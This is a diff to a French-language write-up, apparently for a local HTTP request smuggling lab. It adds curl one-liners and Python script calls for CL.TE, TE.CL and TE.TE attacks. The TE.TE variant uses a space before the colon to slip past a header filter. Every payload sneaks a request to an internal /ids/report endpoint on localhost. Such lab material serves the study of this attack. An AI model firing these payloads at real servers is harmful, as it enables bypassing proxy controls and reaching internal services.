@@ -28,16 +28,33 @@ POST / HTTP/1.1
 Host: localhost:3000
 Content-Type: application/x-www-form-urlencoded
 Transfer-Encoding: chunked
-Content-Length: 138
+Content-Length: 139
 
 0
 
 POST /ids/report HTTP/1.1
 Host: localhost:8888
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 400
+Content-Length: 1500
 
 threat_data=
+```
+
+**Exploit (Python - Recommandé pour Windows) :**
+
+```bash
+python exploit_cl_te.py
+```
+
+**Exploit (Curl - Nécessite bash/zsh ou WSL sur Windows) :**
+
+```bash
+# Note: La syntaxe $'...' ne fonctionne PAS sur PowerShell Windows
+# Utilisez Git Bash, WSL, ou le script Python ci-dessus
+curl -i -s -X POST http://localhost:3000 \
+-H "Transfer-Encoding: chunked" \
+-H "Content-Length: 139" \
+--data-binary $'0\r\n\r\nPOST /ids/report HTTP/1.1\r\nHost: localhost:8888\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1500\r\n\r\nthreat_data='
 ```
 
 ---
@@ -54,16 +71,33 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 4
 Transfer-Encoding: chunked
 
-85
+86
 POST /ids/report HTTP/1.1
 Host: localhost:8888
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 400
+Content-Length: 1500
 
 threat_data=
 0
 
 
+```
+
+**Exploit (Python - Recommandé pour Windows) :**
+
+```bash
+python exploit_te_cl.py
+```
+
+**Exploit (Curl - Nécessite bash/zsh ou WSL sur Windows) :**
+
+```bash
+# Note: La syntaxe $'...' ne fonctionne PAS sur PowerShell Windows
+# Utilisez Git Bash, WSL, ou le script Python ci-dessus
+curl -i -s -X POST http://localhost:3000 \
+-H "Content-Length: 4" \
+-H "Transfer-Encoding: chunked" \
+--data-binary $'86\r\nPOST /ids/report HTTP/1.1\r\nHost: localhost:8888\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1500\r\n\r\nthreat_data=\r\n0\r\n\r\n'
 ```
 
 ---
@@ -78,16 +112,34 @@ POST / HTTP/1.1
 Host: localhost:3000
 Content-Type: application/x-www-form-urlencoded
 Transfer-Encoding : chunked
-Content-Length: 138
+Content-Length: 139
 
 0
 
 POST /ids/report HTTP/1.1
 Host: localhost:8888
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 400
+Content-Length: 1500
 
 threat_data=
+```
+
+**Exploit (Python - Recommandé pour Windows) :**
+
+```bash
+python exploit_te_te.py
+```
+
+**Exploit (Curl - Nécessite bash/zsh ou WSL sur Windows) :**
+
+```bash
+# Note: L'espace avant le deux-points dans "Transfer-Encoding : chunked" permet de bypasser le filtre
+# La syntaxe $'...' ne fonctionne PAS sur PowerShell Windows
+# Utilisez Git Bash, WSL, ou le script Python ci-dessus
+curl -i -s -X POST http://localhost:3000 \
+-H "Transfer-Encoding : chunked" \
+-H "Content-Length: 139" \
+--data-binary $'0\r\n\r\nPOST /ids/report HTTP/1.1\r\nHost: localhost:8888\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1500\r\n\r\nthreat_data='
 ```
 
 ## Vérification
